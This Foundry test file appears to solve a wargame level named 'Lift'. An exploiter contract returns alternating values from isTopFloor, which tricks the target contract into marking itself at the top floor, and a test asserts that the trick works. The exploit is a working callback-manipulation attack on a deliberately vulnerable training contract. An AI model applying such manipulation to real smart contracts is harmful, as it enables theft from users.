// SPDX-License-Identifier: MIT
pragma solidity ^0.8.25;

import "./BaseTest.t.sol";
import "src/07_Lift/Lift.sol";

contract LiftExploiter is House {
    bool isTopFloorFlag = true;

    function isTopFloor(uint256) external returns (bool) {
        isTopFloorFlag = !isTopFloorFlag;
        return isTopFloorFlag;
    }

    function exploit(Lift _lift) public {
        _lift.goToFloor(1);
    }
}

// forge test --match-contract LiftTest
contract LiftTest is BaseTest {
    Lift instance;
    bool isTop = true;

    function setUp() public override {
        super.setUp();

        instance = new Lift();
    }

    function testExploitLevel() public {
        (new LiftExploiter()).exploit(instance);

        checkSuccess();
    }

    function checkSuccess() internal view override {
        assertTrue(instance.top(), "Solution is not solving the level");
    }
}
